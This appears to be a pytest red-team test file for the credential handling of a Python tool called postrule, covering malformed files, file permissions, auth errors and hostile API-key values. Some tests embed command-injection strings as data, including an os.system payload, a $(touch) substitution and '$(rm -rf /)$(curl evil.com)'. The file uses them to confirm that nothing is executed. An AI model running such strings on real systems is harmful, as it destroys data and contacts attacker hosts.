# Copyright (c) 2026 B-Tree Labs
# SPDX-License-Identifier: Apache-2.0

"""Auth / credential-handling abuse tests.

Coverage:
  - Tampered credentials file (malformed JSON, wrong types, missing keys)
  - POSTRULE_API_KEY env-var with shell metacharacters
  - whoami CLI key-truncation must not render shell-active chars unsanitized
  - Missing / expired API key: cloud calls fail with a clear error;
    OSS classification continues to work
  - Credentials file mode: must be 0600 after save_credentials.
"""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

pytestmark = pytest.mark.redteam


# ---------------------------------------------------------------------
# Tampered credentials file
# ---------------------------------------------------------------------


def test_load_credentials_returns_none_on_malformed_json(tmp_path, monkeypatch):
    """A garbled credentials file must not crash; load_credentials
    returns None and the caller treats the user as logged-out.
    """
    from postrule import auth

    cred_dir = tmp_path / ".postrule"
    cred_dir.mkdir()
    cred_path = cred_dir / "credentials"
    cred_path.write_text("{this is not json")

    # Ensure no env-var fallback masks the file.
    monkeypatch.delenv("POSTRULE_API_KEY", raising=False)

    creds = auth.load_credentials()
    assert creds is None


def test_load_credentials_returns_none_on_non_dict_payload(tmp_path, monkeypatch):
    """JSON that's a list / number / string instead of a dict: refuse cleanly."""
    from postrule import auth

    monkeypatch.delenv("POSTRULE_API_KEY", raising=False)
    cred_dir = tmp_path / ".postrule"
    cred_dir.mkdir()

    for payload in ("[]", "42", '"a-string"', "null", "true"):
        (cred_dir / "credentials").write_text(payload)
        assert auth.load_credentials() is None, f"non-dict payload {payload!r} must yield None"


def test_load_credentials_returns_none_on_missing_api_key(tmp_path, monkeypatch):
    """JSON dict without an api_key field: refuse cleanly."""
    from postrule import auth

    monkeypatch.delenv("POSTRULE_API_KEY", raising=False)
    cred_dir = tmp_path / ".postrule"
    cred_dir.mkdir()
    (cred_dir / "credentials").write_text(json.dumps({"email": "user@x"}))
    assert auth.load_credentials() is None


def test_load_credentials_does_not_eval_payload(tmp_path, monkeypatch):
    """A JSON payload containing a stringified Python expression must
    NOT be eval'd. We pin this by shipping a payload that, if
    eval'd, would write a sentinel file.
    """
    from postrule import auth

    sentinel = tmp_path / "would-have-evaled"
    monkeypatch.delenv("POSTRULE_API_KEY", raising=False)
    cred_dir = tmp_path / ".postrule"
    cred_dir.mkdir()
    payload = {
        "api_key": f"__import__('os').system('touch {sentinel}')",
        "email": "evil@x",
    }
    (cred_dir / "credentials").write_text(json.dumps(payload))

    creds = auth.load_credentials()
    # The api_key string is opaque text, not eval'd.
    assert creds is not None
    assert creds["api_key"] == payload["api_key"]
    assert not sentinel.exists()


# ---------------------------------------------------------------------
# POSTRULE_API_KEY env var: opaque, never shell-interpolated
# ---------------------------------------------------------------------


def test_postrule_api_key_env_var_treated_as_opaque(monkeypatch, tmp_path):
    """A POSTRULE_API_KEY containing shell metacharacters must be
    accepted as opaque text, never passed to a shell.
    """
    from postrule import auth

    sentinel = tmp_path / "would-have-shelled"
    # Note: shell expansion happens in the SHELL, not in Python's
    # os.environ.get. We're pinning that load_credentials does NOT
    # invoke a shell on the value.
    hostile = f"$(touch {sentinel})"
    monkeypatch.setenv("POSTRULE_API_KEY", hostile)

    creds = auth.load_credentials()
    assert creds is not None
    assert creds["api_key"] == hostile
    assert not sentinel.exists()


def test_postrule_api_key_with_newlines(monkeypatch):
    """A multi-line key must not be silently truncated or split into
    multiple records anywhere downstream.
    """
    from postrule import auth

    monkeypatch.setenv("POSTRULE_API_KEY", "line1\nline2\nline3")
    creds = auth.load_credentials()
    assert creds is not None
    assert creds["api_key"] == "line1\nline2\nline3"


# ---------------------------------------------------------------------
# whoami truncation: never render shell-active chars unsanitized
# ---------------------------------------------------------------------


def test_whoami_truncation_does_not_leak_shell_chars(monkeypatch, capsys):
    """``postrule whoami`` prints a truncated key. For a hostile key
    (``$(rm -rf /)``), the 12-char truncation displays the literal
    chars; we don't pass them through a shell, so it's safe.

    Pin that the printed output:
      - contains the expected shape (8...4 chars), AND
      - does NOT execute any embedded shell metachars (sentinel file).
    """
    import argparse

    from postrule.cli import cmd_whoami

    monkeypatch.setenv(
        "POSTRULE_API_KEY",
        "$(rm -rf /)$(curl evil.com)abcd1234",
    )
    args = argparse.Namespace()
    rc = cmd_whoami(args)
    out = capsys.readouterr().out
    assert rc == 0
    # 12-char truncation: first 8 + "..." + last 4. The stored key is
    # opaque, so the literal chars appear in stdout - that's print()
    # behavior, not shell execution.
    assert "..." in out


def test_whoami_with_extremely_long_key(monkeypatch, capsys):
    """A 1MB key must be truncated for display, not dumped wholesale."""
    import argparse

    from postrule.cli import cmd_whoami

    monkeypatch.setenv("POSTRULE_API_KEY", "X" * (1024 * 1024))
    rc = cmd_whoami(argparse.Namespace())
    assert rc == 0
    out = capsys.readouterr().out
    # Truncated.
    assert len(out) < 200, f"whoami leaked the full long key into output: {len(out)} bytes"


# ---------------------------------------------------------------------
# Credentials file mode
# ---------------------------------------------------------------------


@pytest.mark.skipif(os.name != "posix", reason="POSIX-only mode test")
def test_save_credentials_enforces_0600(home_writable, tmp_path, monkeypatch):
    """save_credentials must leave the file at mode 0600.

    Uses ``home_writable`` to opt out of the HOME redirect so we can
    write to a real ~/.postrule-style path; we override HOME to tmp_path
    explicitly.
    """
    from postrule import auth

    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setattr(Path, "home", lambda: tmp_path)

    auth.save_credentials("secret-key", email="user@x")
    cred_path = tmp_path / ".postrule" / "credentials"
    assert cred_path.exists()
    mode = cred_path.stat().st_mode & 0o777
    assert mode == 0o600, f"credentials file mode is {oct(mode)}, expected 0o600"


@pytest.mark.skipif(os.name != "posix", reason="POSIX-only mode test")
def test_save_credentials_overwrites_world_readable_predecessor(
    home_writable, tmp_path, monkeypatch
):
    """If a previous credentials file existed at mode 0644, save_credentials
    must overwrite it AND tighten the mode to 0600.

    BUG FIX (defense-in-depth): the existing implementation chmods after
    write, so a tightening on overwrite is automatic. Test pins it.
    """
    from postrule import auth

    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setattr(Path, "home", lambda: tmp_path)

    cred_dir = tmp_path / ".postrule"
    cred_dir.mkdir()
    cred_path = cred_dir / "credentials"
    cred_path.write_text(json.dumps({"api_key": "old", "email": "old@x"}))
    os.chmod(cred_path, 0o644)

    auth.save_credentials("new-key", email="new@x")
    mode = cred_path.stat().st_mode & 0o777
    assert mode == 0o600


# ---------------------------------------------------------------------
# OSS classification works without credentials
# ---------------------------------------------------------------------


def test_dispatch_works_without_api_key(monkeypatch):
    """Classifying an input must NOT require a logged-in account.

    OSS-first: cloud features are opt-in. No credentials, no problem.
    """
    from postrule import LearnedSwitch

    monkeypatch.delenv("POSTRULE_API_KEY", raising=False)
    sw = LearnedSwitch(rule=lambda _: "ok", name="oss-no-creds")
    result = sw.dispatch("input")
    assert result.label == "ok"


# ---------------------------------------------------------------------
# Mocked cloud endpoint: 401 response → clean error
# ---------------------------------------------------------------------


def test_cloud_call_with_401_raises_clean_error(monkeypatch):
    """When the cloud endpoint returns 401, the cloud client must
    raise a clean HTTPError (or surface a clear ``Unauthorized`` /
    ``RuntimeError`` signal). Never a silent success.
    """
    from postrule.cloud import sync as cloud_sync

    class _FakeResp:
        status_code = 401
        text = "Unauthorized"

        def raise_for_status(self):
            import requests as r

            err = r.HTTPError("401 Unauthorized")
            err.response = self
            raise err

        def json(self):
            return {"error": "Unauthorized"}

    captured = {}

    def fake_post(url, json=None, headers=None, timeout=None):
        captured["url"] = url
        return _FakeResp()

    monkeypatch.setattr(
        cloud_sync,
        "requests",
        type(
            "Reqs",
            (),
            {"post": staticmethod(fake_post), "HTTPError": __import__("requests").HTTPError},
        ),
    )

    # Try to push a (fake) config - must raise.
    import requests as r

    with pytest.raises((r.HTTPError, RuntimeError, Exception)):
        cloud_sync.push_switch_config(
            switch_name="x",
            config={"api_key": "bad"},
            api_key="bad",
        )


# ---------------------------------------------------------------------
# clear_credentials & idempotent cleanup
# ---------------------------------------------------------------------


def test_clear_credentials_idempotent(home_writable, tmp_path, monkeypatch):
    """clear_credentials must be a no-op when the file doesn't exist."""
    from postrule import auth

    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setattr(Path, "home", lambda: tmp_path)

    # No credentials yet.
    auth.clear_credentials()  # must not raise
    auth.clear_credentials()  # idempotent
    assert not (tmp_path / ".postrule" / "credentials").exists()


def test_is_logged_in_false_for_empty_payload(tmp_path, monkeypatch):
    """A credentials file with empty api_key string is NOT a valid login."""
    from postrule import auth

    monkeypatch.delenv("POSTRULE_API_KEY", raising=False)
    cred_dir = tmp_path / ".postrule"
    cred_dir.mkdir()
    (cred_dir / "credentials").write_text(json.dumps({"api_key": "", "email": "x@x"}))
    assert auth.is_logged_in() is False
